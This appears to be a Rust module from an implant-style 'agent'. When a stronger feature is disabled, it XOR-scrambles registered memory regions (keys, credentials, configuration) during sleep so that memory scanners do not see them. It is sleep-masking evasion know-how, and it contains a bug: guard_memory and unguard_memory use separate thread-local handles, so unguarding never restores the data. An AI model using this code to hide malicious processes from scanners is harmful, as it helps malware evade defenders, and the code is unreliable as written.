//! Fallback memory-guard for builds where the `memory-guard` feature is disabled.
//!
//! This module provides a **minimal XOR-based memory encryption** as a safety net
//! when the full `memory-guard` feature (XChaCha20-Poly1305) is not enabled.
//!
//! ## Protection level
//!
//! | Build | Protection |
//! |-------|-----------|
//! | `--features memory-guard` | XChaCha20-Poly1305 AEAD encryption of registered regions |
//! | *(this stub)* | XOR-32 cipher with an `OsRng`-generated key |
//!
//! The XOR cipher is **not** cryptographically strong — a determined analyst who
//! captures both locked and unlocked snapshots can trivially recover the key.
//! However, it raises the bar above plaintext: casual memory scanners that read
//! the process's working set during sleep will see scrambled data rather than
//! readable keys, credentials, or configuration.
//!
//! ## Upgrade path
//!
//! Rebuild the agent with `--features memory-guard` for full protection:
//!
//! ```sh
//! cargo build -p agent --features memory-guard
//! ```

#![cfg(not(feature = "memory-guard"))]

use anyhow::Result;
use std::ptr;
use std::sync::{Mutex, OnceLock};

// ── Statics ──────────────────────────────────────────────────────────────────

/// Registered regions: (pointer, length, label).
///
/// Raw pointers are safe to send across threads because the regions are
/// `'static` and we only access them inside `unsafe` blocks with the
/// caller's responsibility to ensure validity.
static REGISTERED_REGIONS: Mutex<Vec<(*mut u8, usize, &'static str)>> =
    Mutex::new(Vec::new());

/// 32-byte XOR key generated once via `OsRng` and reused for all lock/unlock
/// cycles.  `OnceLock` guarantees lock-free reads after initialisation.
static GUARD_KEY: OnceLock<[u8; 32]> = OnceLock::new();

// ── Opaque handle ────────────────────────────────────────────────────────────

/// Opaque handle returned by [`lock`].  Zero-size in the stub — the key is
/// stored in the module-level `GUARD_KEY` static rather than per-handle.
pub struct KeyHandle;

// ── Public API ───────────────────────────────────────────────────────────────

/// Register a sensitive memory region for XOR-based encryption during sleep.
///
/// The region is recorded in a module-level list.  Subsequent calls to
/// [`lock`] will XOR-scramble it, and [`unlock`] will restore it (XOR is
/// its own inverse).
///
/// # Safety
///
/// The caller must ensure that `buf` remains valid and exclusively owned
/// for the remainder of the program (`'static`).  Use-after-free or
/// concurrent mutation while the guard is active causes undefined behaviour.
#[inline]
pub unsafe fn register(buf: &'static mut [u8], label: &'static str) {
    if let Err(e) = ensure_key() {
        log::error!("memory_guard_stub::register: key initialization failed: {e} — region will NOT be protected");
        return;
    }
    REGISTERED_REGIONS
        .lock()
        .unwrap()
        .push((buf.as_mut_ptr(), buf.len(), label));
    log::debug!(
        "memory_guard_stub: registered region '{}' ({} bytes)",
        label,
        buf.len()
    );
}

/// Lock (XOR-encrypt) all registered regions.
///
/// Iterates over every region and XORs each byte with the corresponding
/// byte of the 32-byte key (cycling).  Returns a [`KeyHandle`] that must
/// be passed to [`unlock`] to restore the data.
///
/// # Errors
///
/// Returns an error if [`ensure_key`] has not been called yet (the key
/// is uninitialised).  XOR with a zero key is a no-op, so we refuse to
/// proceed silently.
#[inline]
pub fn lock() -> Result<KeyHandle> {
    let key = GUARD_KEY.get().copied().ok_or_else(|| {
        anyhow::anyhow!("GUARD_KEY not initialized — call ensure_key() before lock()")
    })?;
    let regions = REGISTERED_REGIONS.lock().unwrap();
    xor_regions(&regions, &key);
    Ok(KeyHandle)
}

/// Unlock (XOR-decrypt) all registered regions.
///
/// XOR is symmetric — applying the same operation with the same key
/// restores the original plaintext.
///
/// # Errors
///
/// Returns an error if [`ensure_key`] has not been called yet (the key
/// is uninitialised).
#[inline]
pub fn unlock(_handle: KeyHandle) -> Result<()> {
    let key = GUARD_KEY.get().copied().ok_or_else(|| {
        anyhow::anyhow!("GUARD_KEY not initialized — call ensure_key() before unlock()")
    })?;
    let regions = REGISTERED_REGIONS.lock().unwrap();
    xor_regions(&regions, &key);
    Ok(())
}

/// Guard memory for the current sleep window.
///
/// Locks all registered regions and stores the handle thread-locally until
/// [`unguard_memory`] is called.
#[inline]
pub fn guard_memory() -> Result<()> {
    // Store the handle in a thread-local so unguard_memory can consume it.
    thread_local! {
        static GUARD_HANDLE: std::cell::RefCell<Option<KeyHandle>> =
            std::cell::RefCell::new(None);
    }
    let handle = lock()?;
    GUARD_HANDLE.with(|h| {
        *h.borrow_mut() = Some(handle);
    });
    Ok(())
}

/// Undo a prior [`guard_memory`] call.
///
/// Retrieves the previously stashed lock handle and decrypts all guarded
/// regions.
#[inline]
pub fn unguard_memory() -> Result<()> {
    thread_local! {
        static GUARD_HANDLE: std::cell::RefCell<Option<KeyHandle>> =
            std::cell::RefCell::new(None);
    }
    GUARD_HANDLE.with(|h| {
        if let Some(handle) = h.borrow_mut().take() {
            unlock(handle)
        } else {
            Ok(())
        }
    })
}

/// Sleep while memory guard is active.
///
/// Encrypts sensitive regions before sleep, sleeps (or wakes early on a
/// signal), then decrypts regions on wake.
///
/// The `mask_rotation_interval` parameter is ignored in the stub — there is
/// no key rotation for the XOR cipher.
#[inline]
pub async fn guarded_sleep(
    duration: std::time::Duration,
    wake_rx: Option<tokio::sync::watch::Receiver<bool>>,
    _mask_rotation_interval: u64,
) -> Result<()> {
    let _handle = lock()?;
    use tokio::time::sleep;
    match wake_rx {
        Some(mut rx) => {
            tokio::select! {
                _ = sleep(duration) => {},
                _ = rx.changed() => {}
            }
        }
        None => sleep(duration).await,
    }
    // _handle drops here — unlock via explicit call since KeyHandle is ZST
    unlock(KeyHandle)?;
    Ok(())
}

/// Register the active transport/session key for guard coverage.
///
/// # Safety
///
/// This is a best-effort stub.  It logs the registration but the session
/// key material is not tracked as a separate protected region — only
/// regions explicitly registered via [`register`] are XOR-guarded.
#[inline]
pub fn register_session_key(_session: &common::CryptoSession) {
    // No-op in the stub — session key must be registered via register()
    // with a 'static mutable reference to be covered by the XOR guard.
}

/// Initialise (or re-initialise) the scheme rotation configuration.
///
/// No-op in the stub — the XOR cipher has no scheme rotation.
#[inline]
pub fn init_schemes(
    _schemes: Vec<common::config::SleepScheme>,
    _rotation_interval: u32,
) {
    // No-op in the stub.
}

// ── Internal helpers ─────────────────────────────────────────────────────────

/// Generate the XOR key on first use and emit the protection-level warning.
///
/// Returns an error if key generation fails or produces an all-zeros key
/// (which would be a silent no-op during encryption).
fn ensure_key() -> Result<()> {
    GUARD_KEY.get_or_init(|| {
        log::warn!(
            "memory-guard: feature disabled; using XOR-based stub encryption \
             (NOT as strong as XChaCha20-Poly1305; enable memory-guard feature for full protection)"
        );
        let mut k = [0u8; 32];
        // OsRng provides cryptographic randomness even in freestanding
        // contexts; never fall back to thread_rng for key material.
        use rand::RngCore;
        rand::rngs::OsRng.fill_bytes(&mut k);
        k
    });
    // Verify the key is not all-zeros (sanity check against silent no-op).
    let key = GUARD_KEY.get().unwrap();
    if key.iter().all(|&b| b == 0) {
        anyhow::bail!("GUARD_KEY generation produced all-zeros key");
    }
    log::info!("memory_guard_stub: XOR key initialized successfully");
    Ok(())
}

/// Apply the XOR cipher to every registered region.
fn xor_regions(
    regions: &[(*mut u8, usize, &'static str)],
    key: &[u8; 32],
) {
    for &(ptr, len, label) in regions {
        if ptr.is_null() || len == 0 {
            continue;
        }
        unsafe {
            let slice = ptr::slice_from_raw_parts_mut(ptr, len);
            // SAFETY: caller guaranteed the region is valid and exclusively
            // owned when they called register().
            let slice = &mut *slice;
            for (i, byte) in slice.iter_mut().enumerate() {
                *byte ^= key[i % 32];
            }
        }
        log::debug!(
            "memory_guard_stub: XOR-locked region '{}' ({} bytes)",
            label,
            len
        );
    }
}
